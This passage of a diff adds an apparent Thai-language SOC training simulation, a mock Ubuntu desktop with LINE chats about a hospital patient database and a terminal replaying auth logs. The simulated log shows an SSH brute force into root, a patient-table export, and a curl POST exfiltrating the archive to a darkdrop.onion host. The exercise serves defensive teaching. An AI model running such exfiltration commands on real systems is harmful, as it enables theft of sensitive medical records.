+                  <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.8 19.79 19.79 0 01.21 1.17 2 2 0 012.22 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 7.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/>
+                </svg>
+              </div>
+
+              <div class="header-action-btn">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5">
+                  <circle cx="12" cy="12" r="1"/>
+                  <circle cx="19" cy="12" r="1"/>
+                  <circle cx="5" cy="12" r="1"/>
+                </svg>
+              </div>
+            </div>
+          </div>
+
+          <div class="messages-area" id="messagesArea">
+            <div class="date-chip">วันนี้ 02:17</div>
+          </div>
+
+          <div class="chat-input-area">
+            <div class="reply-options" id="replyOptions">
+<button class="reply-option" data-reply="ออนไลน์อยู่ กำลังตรวจสอบฐานข้อมูลผู้ป่วยและหน้าจอ ICU เลย">
+                ออนไลน์อยู่ กำลังตรวจสอบเลย
+              </button>
+            </div>
+
+            <div class="input-row">
+              <div class="input-btn">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2">
+                  <circle cx="12" cy="12" r="10"/>
+                  <path d="M8 14s1.5 2 4 2 4-2 4-2"/>
+                  <line x1="9" y1="9" x2="9.01" y2="9"/>
+                  <line x1="15" y1="9" x2="15.01" y2="9"/>
+                </svg>
+              </div>
+
+              <div class="input-box" id="inputBox">รอเพจ...</div>
+
+              <div class="input-actions">
+                <div class="input-btn">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2">
+                    <rect x="3" y="3" width="18" height="18" rx="2"/>
+                    <circle cx="8.5" cy="8.5" r="1.5"/>
+                    <polyline points="21 15 16 10 5 21"/>
+                  </svg>
+                </div>
+
+                <div class="send-btn">
+                  <svg width="13" height="13" viewBox="0 0 24 24" fill="white">
+                    <path d="M22 2L11 13M22 2L15 22 11 13 2 9l20-7z"/>
+                  </svg>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div> 
+    </div>
+
+    <div id="checkTerminalText" style="display:none; position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%); color: #06c755; font-size: 14px; font-weight: 500; z-index: 10;">Check terminal</div>
+
+    <div id="terminalWindow" class="app-window terminal-window">
+      <div class="window-titlebar terminal-titlebar drag-handle">
+        <span style="font-size: 12.5px; color: rgba(255,255,255,0.75); font-weight: 400;">root@ubuntu:~#</span>
+        <div style="flex:1"></div>
+        <button class="ubuntu-win-btn ubuntu-win-btn-min">─</button>
+        <button class="ubuntu-win-btn ubuntu-win-btn-max">☐</button>
+        <button class="ubuntu-win-btn ubuntu-win-btn-close">✕</button>
+      </div>
+      <div id="terminalContent" class="terminal-content"></div>
+      <div class="terminal-statusbar">
+        <span>root@hospital-db</span>
+        <span class="muted">|</span>
+        <span>~</span>
+        <span class="muted">|</span>
+        <span>bash</span>
+        <span style="flex:1"></span>
+        <span style="color: rgba(255,255,255,0.4);">utf-8</span>
+      </div>
+    </div>
+
+    <div id="notificationPopup" class="app-window" style="display:none; position: absolute; top: 40px; right: 20px; width: 300px; background: #fff; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); z-index: 100; overflow: hidden;">
+      <div class="drag-handle" style="padding: 12px 15px; background: #f59e0b; color: white; font-size: 12px; font-weight: 600;">IT Infrastructure</div>
+      <div style="padding: 12px 15px;">
+        <div style="font-size: 13px; color: #333;">โย ลองดูนี่หน่อย 👀</div>
+      </div>
+    </div>
+
+    <div id="imagePopup" class="app-window" style="display:none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 600px; background: #1a1a1a; border-radius: 10px; box-shadow: 0 8px 40px rgba(0,0,0,0.5); z-index: 200; overflow: hidden;">
+      <div class="window-titlebar drag-handle" style="background: #2d2d2d;">
+        <span style="font-size: 12.5px; color: rgba(255,255,255,0.75); font-weight: 400;">img.png</span>
+        <div style="flex:1"></div>
+        <button class="ubuntu-win-btn ubuntu-win-btn-close" onclick="document.getElementById('imagePopup').style.display='none'">✕</button>
+      </div>
+      <div style="padding: 15px; background: #111;">
+        <img src="img.png" alt="screenshot" style="width:100%; border-radius:6px;" onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
+        <div style="display:none; color:#888; text-align:center; padding:40px;">Image not found</div>
+      </div>
+    </div>
+
+    <div id="missionAlertBackdrop" class="ubuntu-alert-backdrop" role="dialog" aria-modal="true" aria-labelledby="missionAlertTitle">
+      <div class="ubuntu-alert">
+        <div class="ubuntu-alert-header" id="systemAlertHeader">System Alert</div>
+        <div class="ubuntu-alert-body">
+          <div class="ubuntu-alert-icon">
+            <span class="material-symbols-outlined">warning</span>
+          </div>
+          <div>
+            <div class="ubuntu-alert-title" id="missionAlertTitle">Mission Lock</div>
+            <div class="ubuntu-alert-text" id="systemAlertText">นี่ไม่ใช่ส่วนหนึ่งของภารกิจ</div>
+          </div>
+        </div>
+        <div class="ubuntu-alert-actions">
+          <button id="missionAlertOk" class="ubuntu-alert-btn">OK</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const messagesArea = document.getElementById("messagesArea");
+    const replyOptions = document.getElementById("replyOptions");
+    const inputBox = document.getElementById("inputBox");
+    const dockBadge = document.getElementById("dockBadge");
+    const chatUnread = document.getElementById("chatUnread");
+    const doctorPreview = document.getElementById("doctorPreview");
+    const doctorStatus = document.getElementById("doctorStatus");
+    const missionAlertBackdrop = document.getElementById("missionAlertBackdrop");
+    const missionAlertOk = document.getElementById("missionAlertOk");
+    const systemAlertHeader = document.getElementById("systemAlertHeader");
+    const systemAlertTitle = document.getElementById("missionAlertTitle");
+    const systemAlertText = document.getElementById("systemAlertText");
+    const lineWindow = document.getElementById("lineWindow");
+    const terminalWindow = document.getElementById("terminalWindow");
+    const lineDockItem = document.getElementById("lineDockItem");
+    const terminalDockItem = document.getElementById("terminalDockItem");
+    const dockElement = document.querySelector(".dock");
+
+    const ubuntuScreen = document.querySelector(".ubuntu-screen");
+    let unreadCount = 0;
+    let terminalOpen = false;
+    let authLogInterval = null;
+    let topWindowZ = 220;
+
+    const appStates = {
+      line: {
+        key: "line",
+        el: lineWindow,
+        dock: lineDockItem,
+        canOpen: () => true,
+        hidden: false,
+        minimized: false,
+        maximized: false,
+        normalRect: null
+      },
+      terminal: {
+        key: "terminal",
+        el: terminalWindow,
+        dock: terminalDockItem,
+        canOpen: () => terminalOpen,
+        hidden: true,
+        minimized: false,
+        maximized: false,
+        normalRect: null
+      }
+    };
+
+    const authLogs = [
+      'Apr 24 02:08:52 hospital-db sudo:     root : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/usr/bin/systemctl status ssh',
+      'Apr 24 02:09:11 hospital-db sshd[18421]: Invalid user admin from 185.220.101.47 port 51102',
+      'Apr 24 02:09:11 hospital-db sshd[18421]: pam_unix(sshd:auth): check pass; user unknown',
+      'Apr 24 02:09:11 hospital-db sshd[18421]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47',
+      'Apr 24 02:09:13 hospital-db sshd[18421]: Failed password for invalid user admin from 185.220.101.47 port 51102 ssh2',
+      'Apr 24 02:09:18 hospital-db sshd[18424]: Invalid user test from 185.220.101.47 port 51118',
+      'Apr 24 02:09:18 hospital-db sshd[18424]: pam_unix(sshd:auth): check pass; user unknown',
+      'Apr 24 02:09:20 hospital-db sshd[18424]: Failed password for invalid user test from 185.220.101.47 port 51118 ssh2',
+      'Apr 24 02:09:27 hospital-db sshd[18429]: Failed password for root from 185.220.101.47 port 51131 ssh2',
+      'Apr 24 02:09:32 hospital-db sshd[18431]: Failed password for root from 185.220.101.47 port 51144 ssh2',
+      'Apr 24 02:09:39 hospital-db sshd[18435]: Failed password for root from 185.220.101.47 port 51159 ssh2',
+      'Apr 24 02:09:47 hospital-db sshd[18439]: Accepted password for root from 185.220.101.47 port 51172 ssh2',
+      'Apr 24 02:09:47 hospital-db sshd[18439]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)',
+      'Apr 24 02:09:47 hospital-db systemd-logind[721]: New session 88 of user root.',
+      'Apr 24 02:10:02 hospital-db sudo:     root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/whoami',
+      'Apr 24 02:10:17 hospital-db sudo:     root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ls /var/www/hospital',
+      'Apr 24 02:10:44 hospital-db sudo:     root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/python3 /opt/scripts/db_export.py --target patients_2024 --output /tmp/patients_2024.sql',
+      'Apr 24 02:11:03 hospital-db CRON[18488]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)',
+      'Apr 24 02:11:03 hospital-db CRON[18489]: (root) CMD (/usr/local/bin/db_health_check.sh)',
+      'Apr 24 02:11:04 hospital-db CRON[18488]: pam_unix(cron:session): session closed for user root',
+      'Apr 24 02:13:28 hospital-db sudo:     root : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/patients_2024.tar.gz patients_2024.sql',
+      'Apr 24 02:15:51 hospital-db sudo:     root : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -X POST --data-binary @patients_2024.tar.gz http://darkdrop.onion/upload',
+      'Apr 24 02:16:55 hospital-db kernel: [392811.422719] OUTBOUND eth0 SRC=10.0.2.15 DST=45.142.122.91 LEN=1500 PROTO=TCP SPT=42110 DPT=80',
+      'Apr 24 02:16:56 hospital-db sshd[18439]: Received disconnect from 185.220.101.47 port 51172:11: disconnected by user',
+      'Apr 24 02:16:56 hospital-db sshd[18439]: pam_unix(sshd:session): session closed for user root',
+      'Apr 24 02:16:56 hospital-db systemd-logind[721]: Session 88 logged out. Waiting for processes to exit.',
+      'Apr 24 02:16:56 hospital-db systemd-logind[721]: Removed session 88.'
+    ];
+
+    function clamp(value, min, max) {
+      return Math.min(Math.max(value, min), max);
+    }
+
+    function getDockBoundary() {
+      return (dockElement ? dockElement.offsetWidth : 0) + 8;
+    }
+
+    function getWindowRect(win) {
+      return {
+        left: win.offsetLeft,
+        top: win.offsetTop,
+        width: win.offsetWidth,
+        height: win.offsetHeight
+      };
+    }
+
+    function setWindowRect(win, rect) {
+      win.style.left = `${Math.round(rect.left)}px`;
+      win.style.top = `${Math.round(rect.top)}px`;
+      win.style.width = `${Math.round(rect.width)}px`;
+      win.style.height = `${Math.round(rect.height)}px`;
+      win.style.right = "auto";
+      win.style.bottom = "auto";
+      win.style.transform = "";
+    }
+
+    function getMaximizedRect() {
+      const sideGap = 8;
+      const topGap = 8;
+      const left = getDockBoundary();
+      const top = 26 + topGap;
+      const width = Math.max(ubuntuScreen.clientWidth - left - sideGap, 320);
+      const height = Math.max(ubuntuScreen.clientHeight - top - sideGap, 220);
+      return { left, top, width, height };
+    }
+
+    function setDockActive(key) {
+      lineDockItem.classList.toggle("active", key === "line");
+      terminalDockItem.classList.toggle("active", key === "terminal");
+    }
+
+    function getAppStateByWindow(win) {
+      return Object.values(appStates).find(state => state.el === win) || null;
+    }
+
+    async function animateWindowToDock(state, hideMode = "minimize") {
+      if (!state || state.hidden) return;
+
+      const from = state.el.getBoundingClientRect();
+      const to = state.dock.getBoundingClientRect();
+      const dx = (to.left + to.width / 2) - (from.left + from.width / 2);
+      const dy = (to.top + to.height / 2) - (from.top + from.height / 2);
+      const sx = Math.max(to.width / from.width, 0.08);
+      const sy = Math.max(to.height / from.height, 0.08);
+
+      state.el.style.pointerEvents = "none";
+      await state.el.animate(
+        [
+          { transform: "translate(0, 0) scale(1)", opacity: 1 },
+          { transform: `translate(${dx}px, ${dy}px) scale(${sx}, ${sy})`, opacity: 0.15 }
+        ],
+        {
+          duration: 280,
+          easing: "cubic-bezier(.2,.7,.2,1)",
+          fill: "forwards"
+        }
+      ).finished;
+
+      state.el.style.display = "none";
+      state.el.style.pointerEvents = "";
+      state.el.style.transform = "";
+      state.el.style.opacity = "";
+      state.hidden = true;
+      state.minimized = hideMode === "minimize";
+      setDockActive("");
+    }
+
+    async function animateWindowFromDock(state) {
+      if (!state || !state.canOpen()) return;
+
+      state.el.style.display = "block";
+      if (state.maximized) {
+        setWindowRect(state.el, getMaximizedRect());
+      } else if (state.normalRect) {
+        setWindowRect(state.el, state.normalRect);
+      }
+
+      bringToFront(state.el);
+      const from = state.dock.getBoundingClientRect();
+      const to = state.el.getBoundingClientRect();
+      const dx = (from.left + from.width / 2) - (to.left + to.width / 2);
+      const dy = (from.top + from.height / 2) - (to.top + to.height / 2);
+      const sx = Math.max(from.width / to.width, 0.08);
+      const sy = Math.max(from.height / to.height, 0.08);
+
+      state.el.style.pointerEvents = "none";
+      await state.el.animate(
+        [
+          { transform: `translate(${dx}px, ${dy}px) scale(${sx}, ${sy})`, opacity: 0.15 },
+          { transform: "translate(0, 0) scale(1)", opacity: 1 }
+        ],
+        {
+          duration: 300,
+          easing: "cubic-bezier(.18,.75,.2,1)",
+          fill: "forwards"
+        }
+      ).finished;
+
+      state.el.style.pointerEvents = "";
+      state.el.style.transform = "";
+      state.el.style.opacity = "";
+      state.hidden = false;
+      state.minimized = false;
+      setDockActive(state.key);
+    }
+
+    function maximizeApp(state) {
+      if (!state || state.hidden) return;
+      if (!state.maximized) {
+        state.normalRect = getWindowRect(state.el);
+        state.maximized = true;
+      }
+      setWindowRect(state.el, getMaximizedRect());
+      bringToFront(state.el);
+    }
+
+    function restoreApp(state) {
+      if (!state || state.hidden || !state.maximized) return;
+      state.maximized = false;
+      if (state.normalRect) {
+        setWindowRect(state.el, state.normalRect);
+      }
+      bringToFront(state.el);
+    }
+
+    function showApp(key, animate = true) {
+      const target = appStates[key];
+      if (!target || !target.canOpen()) return;
+
+      const otherKey = key === "line" ? "terminal" : "line";
+      const other = appStates[otherKey];
+
+      if (!other.hidden) {
+        other.el.style.display = "none";
+        other.hidden = true;
+      }
+
+      if (target.hidden && animate && target.dock) {
+        animateWindowFromDock(target);
+      } else {
+        target.el.style.display = "block";
+        target.hidden = false;
+        target.minimized = false;
+        bringToFront(target.el);
+        setDockActive(key);
+      }
+    }
+
+    function wireWindowControls(state) {
+      const minBtn = state.el.querySelector(".ubuntu-win-btn-min");
+      const maxBtn = state.el.querySelector(".ubuntu-win-btn-max");
+      const closeBtn = state.el.querySelector(".ubuntu-win-btn-close");
+
+      if (minBtn) {
+        minBtn.addEventListener("click", (event) => {
+          event.stopPropagation();
+          if (!state.maximized) {
+            state.normalRect = getWindowRect(state.el);
+          }
+          animateWindowToDock(state, "minimize");
+        });
+      }
+
+      if (maxBtn) {
+        maxBtn.addEventListener("click", (event) => {
+          event.stopPropagation();
+          if (state.maximized) {
+            restoreApp(state);
+          } else {
+            maximizeApp(state);
+          }
+        });
+      }
+
+      if (closeBtn) {
+        closeBtn.addEventListener("click", (event) => {
+          event.stopPropagation();
+          if (!state.maximized) {
+            state.normalRect = getWindowRect(state.el);
+          }
+          animateWindowToDock(state, "close");
+        });
+      }
+    }
+
+    function bringToFront(win) {
+      topWindowZ += 1;
+      win.style.zIndex = String(topWindowZ);
+    }
+
+    function bringOverlayToFront(win) {
+      topWindowZ += 1;
+      win.style.zIndex = String(topWindowZ + 1000);
+    }
+
+    function showMissionAlert() {
+      openSystemAlert("System Alert", "Mission Lock", "นี่ไม่ใช่ส่วนหนึ่งของภารกิจ");
+    }
+
+    function openSystemAlert(header, title, message) {
+      systemAlertHeader.textContent = header;
+      systemAlertTitle.textContent = title;
+      systemAlertText.textContent = message;
+      missionAlertBackdrop.style.display = "flex";
+    }
+
+    function hideMissionAlert() {
+      missionAlertBackdrop.style.display = "none";
+    }
+
+    function emitDsplWatermark() {
+      const watermark = "dsplay - watermark | this is added by dsplCode, you can remove this :D";
+      window.__dsplWatermarkSignature = watermark;
+      console.log(watermark);
+    }
+
+    function verifyDsplIntegrity() {
+      const expected = "dsplay - watermark | this is added by dsplCode, you can remove this :D";
+      const marker = document.querySelector('meta[name="dspl-watermark"]');
+      const hasMarker = !!marker && marker.getAttribute("content") === expected;
+      const hasRuntimeSignature = window.__dsplWatermarkSignature === expected;
+
+      if (!hasMarker || !hasRuntimeSignature) {
+        openSystemAlert("System Alert", "Integrity Check", "Cannot verify this code's integrity.");
+      }
+    }
+
+    function showNotificationPopup() {
+      const notif = document.getElementById("notificationPopup");
+      notif.style.display = "block";
+      bringOverlayToFront(notif);
+    }
+
+    function showImagePopup() {
+      const popup = document.getElementById("imagePopup");
+
+      popup.style.display = "block";
+      popup.style.transform = "";
+
+      const minLeft = getDockBoundary();
+      const maxLeft = Math.max(ubuntuScreen.clientWidth - popup.offsetWidth - 12, minLeft);
+      const centeredLeft = Math.round((ubuntuScreen.clientWidth - popup.offsetWidth) / 2);
+      const nextLeft = clamp(centeredLeft, minLeft, maxLeft);
+
+      const maxTop = Math.max(ubuntuScreen.clientHeight - popup.offsetHeight - 12, 36);
+      const nextTop = clamp(72, 30, maxTop);
+
+      popup.style.left = `${nextLeft}px`;
+      popup.style.top = `${nextTop}px`;
+      popup.style.right = "auto";
+      popup.style.bottom = "auto";
+      bringOverlayToFront(popup);
+    }
+
+    function makeWindowDraggable(win) {
+      const handle = win.querySelector(".drag-handle") || win;
+      if (!handle) return;
+
+      handle.addEventListener("pointerdown", (event) => {
+        if (event.button !== 0) return;
+        if (event.target.closest("button")) return;
+
+        event.preventDefault();
+        bringToFront(win);
+
+        const appState = getAppStateByWindow(win);
+        if (appState && appState.maximized) {
+          return;
+        }
+
+        const screenRect = ubuntuScreen.getBoundingClientRect();
+        const winRect = win.getBoundingClientRect();
+
+        // Convert centered/transformed popups into absolute coordinates before drag.
+        if (win.style.transform && win.style.transform.includes("translate")) {
+          win.style.transform = "";
+          win.style.left = `${winRect.left - screenRect.left}px`;
+          win.style.top = `${winRect.top - screenRect.top}px`;
+        }
+
+        const startOffsetX = event.clientX - winRect.left;
+        const startOffsetY = event.clientY - winRect.top;
+
+        win.classList.add("dragging");
+        handle.setPointerCapture(event.pointerId);
+
+        const onMove = (moveEvent) => {
+          const minLeft = getDockBoundary();
+          const maxLeft = Math.max(screenRect.width - winRect.width, minLeft);
+          const maxTop = Math.max(screenRect.height - winRect.height, 0);
+
+          const nextLeft = clamp(moveEvent.clientX - screenRect.left - startOffsetX, minLeft, maxLeft);
+          const nextTop = clamp(moveEvent.clientY - screenRect.top - startOffsetY, 26, maxTop);
+
+          win.style.left = `${nextLeft}px`;
+          win.style.top = `${nextTop}px`;
+          win.style.right = "auto";
+          win.style.bottom = "auto";
+        };
+
+        const onUp = (upEvent) => {
+          win.classList.remove("dragging");
+          handle.releasePointerCapture(upEvent.pointerId);
+          handle.removeEventListener("pointermove", onMove);
+          handle.removeEventListener("pointerup", onUp);
+          handle.removeEventListener("pointercancel", onUp);
+        };
+
+        handle.addEventListener("pointermove", onMove);
+        handle.addEventListener("pointerup", onUp);
+        handle.addEventListener("pointercancel", onUp);
+      });
+    }
+
+    function addLogLine(text, kind = "system") {
+      const terminalContent = document.getElementById("terminalContent");
+      const line = document.createElement("div");
+      line.className = `term-line ${kind}`;
+
+      if (kind === "command") {
+        const escapedCommand = text
+          .replace(/&/g, "&amp;")
+          .replace(/</g, "&lt;")
+          .replace(/>/g, "&gt;");
+        line.innerHTML = `<span class="term-prompt-user">root@hospital-db</span>:<span class="term-prompt-path">~</span># <span class="term-cmd">${escapedCommand}</span>`;
+      } else {
+        line.textContent = text;
+      }
+
+      terminalContent.appendChild(line);
+      terminalContent.scrollTop = terminalContent.scrollHeight;
+    }
+
+    function addPromptLine(showCursor = true) {
+      const terminalContent = document.getElementById("terminalContent");
+      const line = document.createElement("div");
+      line.className = "term-line command";
+      line.innerHTML = `<span class="term-prompt-user">root@hospital-db</span>:<span class="term-prompt-path">~</span>#${showCursor ? '<span class="term-cursor"></span>' : ''}`;
+      terminalContent.appendChild(line);
+      terminalContent.scrollTop = terminalContent.scrollHeight;
+    }
+
+    async function runTerminalCommands(skipAnimation = false, skipNotification = false) {
+      const term = document.getElementById("terminalContent");
+      term.innerHTML = "";
+
+      if (skipAnimation) {
+        // Just show all logs instantly
+        addLogLine("sudo tail -f /var/log/auth.log", "command");
+        addLogLine("[sudo] password for root:", "system");
+        addPromptLine(false);
+        authLogs.forEach(log => {
+          const kind = log.includes("Accepted password")
+            ? "good"
+            : (log.includes("Failed password") || log.includes("Invalid user"))
+              ? "alert"
+              : (log.includes("curl -X POST") || log.includes("OUTBOUND"))
+                ? "warn"
+                : "system";
+          addLogLine(log, kind);
+        });
+        addPromptLine();
+        return;
+      }
+
+      await new Promise(r => setTimeout(r, 200));
+      addLogLine("sudo tail -f /var/log/auth.log", "command");
+      await new Promise(r => setTimeout(r, 300));
+      addLogLine("[sudo] password for root:", "system");
+      await new Promise(r => setTimeout(r, 500));
+      addPromptLine(false);
+      await new Promise(r => setTimeout(r, 400));
+
+      let logIndex = 0;
+      authLogInterval = setInterval(() => {
+        if (logIndex < authLogs.length) {
+          const log = authLogs[logIndex];
+          const kind = log.includes("Accepted password")
+            ? "good"
+            : (log.includes("Failed password") || log.includes("Invalid user"))
+              ? "alert"
+              : (log.includes("curl -X POST") || log.includes("OUTBOUND"))
+                ? "warn"
+                : "system";
+          addLogLine(log, kind);
+          logIndex++;
+        } else {
+          clearInterval(authLogInterval);
+          addPromptLine();
+
+          // Show IT Infrastructure notification after 10 seconds from terminal open (only if not skipped)
+          if (!skipNotification) {
+            setTimeout(() => {
+              const notif = document.getElementById("notificationPopup");
+              showNotificationPopup();
+
+              // Close notification and show IT message in LINE after 3 seconds
+              setTimeout(() => {
+                notif.style.display = "none";
+              showApp("line", false);
+
+              // Clear previous messages
+              const messagesArea = document.getElementById("messagesArea");
+              messagesArea.innerHTML = '<div class="date-chip">วันนี้ 02:19</div>';
+
+              // Update chat header to IT Infrastructure
+              document.querySelector(".chat-header-avatar").style.background = "#f59e0b";
+              document.querySelector(".chat-header-avatar").textContent = "IT";
+              document.querySelector(".chat-header-name").textContent = "IT Infrastructure";
+              document.querySelector(".chat-header-sub").textContent = "Online";
+
+              // Select IT chat in sidebar
+              document.querySelectorAll(".chat-item").forEach(item => item.classList.remove("selected"));
+              document.querySelectorAll(".chat-item")[2].classList.add("selected");
+
+              // Update reply option for IT chat
+              const replyBtn = document.querySelector("#replyOptions .reply-option");
+              if (replyBtn) {
+                replyBtn.dataset.reply = "ได้เลย กำลังดูให้";
+                replyBtn.textContent = "ได้เลย กำลังดูให้";
+                replyBtn.disabled = false;
+              }
+              document.getElementById("replyOptions").classList.add("visible");
+
+              // Add IT Infrastructure message
+              const itMsgRow = document.createElement("div");
+              itMsgRow.className = "msg-row";
+              itMsgRow.innerHTML = `
+                <div class="msg-row-avatar" style="background:#f59e0b;">IT</div>
+                <div class="msg-bubble">สวัสดีครับ พี่ SOC<br><br><span id="screenshotClick" style="display:inline-block;background:#f5f5f5;border-radius:6px;padding:8px;margin:4px 0;font-size:11px;cursor:pointer;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>screenshot.png</span><br><br>ขอช่วยเช็คให้หน่อยนะว่ามีใครเข้าถึงระบบได้รึเปล่า ผมเห็นอะไรแปลกๆใน logs ฝากด้วยนะครับ</div>
+                <span class="msg-time-label">02:19</span>
+              `;
+              messagesArea.appendChild(itMsgRow);
+
+              // Add click handler for screenshot
+              setTimeout(() => {
+                const screenshotEl = document.getElementById("screenshotClick");
+                if (screenshotEl) {
+                  screenshotEl.addEventListener("click", () => {
+                    showImagePopup();
+                  });
+                }
+              }, 100);
+            }, 3000);
+          }, 10000);
+          }
+        }
+      }, 100);
+    }    
+
+    const doctorMessages = [
+      {
+        text: "น้องๆ ยังอยู่มั้ย",
+        time: "02:17",
+        urgent: false,
+        preview: "น้องๆ ยังอยู่มั้ย"
+      },
+      {
+        text: "ตอนนี้ระบบฐานข้อมูลผู้ป่วยมีปัญหา ค้างมากตอนนี้ลงข้อมูลไรไม่ได้เลย",
+        time: "02:17",
+        urgent: true,
+        preview: "ตอนนี้ระบบฐานข้อมูลผู้ป่วยมีปัญหา ค้างมากตอนนี้ลงข้อมูลไรไม่ได้เลย"
+      },
+      {
+        text: "ฝากดูให้หน่อยขอด่วนๆเลย เออแล้วก็ตอนนี้ระบบ ICU monitoring ก็มีอาการค้างๆเหมือนกัน",
+        time: "02:18",
+        urgent: true,
+        preview: "ฝากดูให้หน่อยขอด่วนๆเลย เออแล้วก็ตอนนี้ระบบ ICU monitoring ก็มีอาการค้างๆเหมือนกัน"
+      }
+    ];
+
+    function setUnread(count) {
+      unreadCount = count;
+      dockBadge.textContent = count;
+      chatUnread.textContent = count;
+
+      if (count === 0) {
+        dockBadge.style.display = "none";
+        chatUnread.style.display = "none";
+      } else {
+        dockBadge.style.display = "flex";
+        chatUnread.style.display = "flex";
+      }
+    }
+
+    function showTyping() {
+      removeTyping();
+
+      doctorStatus.textContent = "ออนไลน์ · กำลังพิมพ์...";
+
+      const typing = document.createElement("div");
+      typing.className = "typing-indicator";
+      typing.id = "typingIndicator";
+
+      typing.innerHTML = `
+        <div class="typing-avatar">ด</div>
+        <div class="typing-dots">
+          <div class="typing-dot"></div>
+          <div class="typing-dot"></div>
+          <div class="typing-dot"></div>
+        </div>
+      `;
+
+      messagesArea.appendChild(typing);
+    }
+
+    function removeTyping() {
+      const typing = document.getElementById("typingIndicator");
+      if (typing) typing.remove();
+    }
+
+    function addDoctorMessage(message) {
+      removeTyping();
+
+      const row = document.createElement("div");
+      row.className = "msg-row";
+
+      row.innerHTML = `
+        <div class="msg-row-avatar">ด</div>
+        <div class="msg-bubble ${message.urgent ? "urgent" : ""}">${message.text}</div>
+        <span class="msg-time-label">${message.time}</span>
+      `;
+
+      messagesArea.appendChild(row);
+      doctorPreview.textContent = message.preview;
+      setUnread(unreadCount + 1);
+
+      doctorStatus.textContent = "ออนไลน์";
+    }
+
+    function addUserMessage(text) {
+      const row = document.createElement("div");
+      row.className = "msg-row from-user";
+
+      row.innerHTML = `
+        <div class="msg-bubble">${text}</div>
+        <span class="msg-time-label">02:19</span>
+      `;
+
+      messagesArea.appendChild(row);
+
+      // Only update Dr. Anan preview if we're in his chat
+      const chatHeaderName = document.querySelector(".chat-header-name").textContent;
+      if (chatHeaderName === "LINE — ดร.อนันต์" || chatHeaderName === "Dr. Anan") {
+        doctorPreview.textContent = text;
+      }
+
+      inputBox.textContent = "ข้อความ";
+      inputBox.classList.add("ready");
+      setUnread(0);
+    }
+
+    function startDoctorPaging() {
+      setUnread(0);
+
+      doctorMessages.forEach((message, index) => {
+        const delayBeforeTyping = index * 2000;
+        const delayBeforeMessage = delayBeforeTyping + 900;
+
+        setTimeout(() => {
+          showTyping();
+        }, delayBeforeTyping);
+
+        setTimeout(() => {
+          addDoctorMessage(message);
+        }, delayBeforeMessage);
+      });
+
+      setTimeout(() => {
+        replyOptions.classList.add("visible");
+        inputBox.textContent = "เลือกตอบกลับ...";
+        inputBox.classList.add("ready");
+      }, doctorMessages.length * 2000 + 700);
+    }
+
+    document.querySelectorAll(".reply-option").forEach(button => {
+      button.addEventListener("click", () => {
+        const chatHeaderName = document.querySelector(".chat-header-name").textContent;
+        const reply = button.dataset.reply;
+        addUserMessage(reply);
+
+        document.querySelectorAll(".reply-option").forEach(btn => {
+          btn.disabled = true;
+        });
+
+        if (chatHeaderName === "IT Infrastructure") {
+          // IT chat reply - go back to terminal after 5 seconds
+          setTimeout(() => {
+            terminalOpen = true;
+            appStates.terminal.hidden = false;
+            runTerminalCommands(true, true);
+            showApp("terminal", false);
+          }, 5000);
+        } else {
+          // Dr. Anan chat reply - show terminal check text first
+          const checkTerminal = document.getElementById("checkTerminalText");
+          checkTerminal.style.display = "block";
+
+          setTimeout(() => {
+            checkTerminal.style.display = "none";
+            terminalOpen = true;
+            appStates.terminal.hidden = false;
+            runTerminalCommands();
+            showApp("terminal", false);
+          }, 5000);
+        }
+      });
+    });
+
+    // Dock item click handlers for app switching
+    lineDockItem.addEventListener("click", () => {
+      showApp("line", true);
+    });
+
+    terminalDockItem.addEventListener("click", () => {
+      showApp("terminal", true);
+    });
+
+    document.getElementById("orbDockItem").addEventListener("click", showMissionAlert);
+    document.getElementById("filesDockItem").addEventListener("click", showMissionAlert);
+    document.getElementById("settingsDockItem").addEventListener("click", showMissionAlert);
+    missionAlertOk.addEventListener("click", hideMissionAlert);
+    missionAlertBackdrop.addEventListener("click", (event) => {
+      if (event.target === missionAlertBackdrop) {
+        hideMissionAlert();
+      }
+    });
+    window.addEventListener("keydown", (event) => {
+      if (event.key === "Escape" && missionAlertBackdrop.style.display === "flex") {
+        hideMissionAlert();
+      }
+    });
+
+    document.querySelectorAll(".app-window").forEach(makeWindowDraggable);
+    document.querySelectorAll(".app-window").forEach(win => {
+      win.addEventListener("pointerdown", () => bringToFront(win));
+    });
+
+    wireWindowControls(appStates.line);
+    wireWindowControls(appStates.terminal);
+    appStates.line.normalRect = getWindowRect(appStates.line.el);
+    appStates.terminal.normalRect = getWindowRect(appStates.terminal.el);
+
+    emitDsplWatermark();
+    verifyDsplIntegrity();
+
+    startDoctorPaging();
+  </script>
+</body>
+</html>
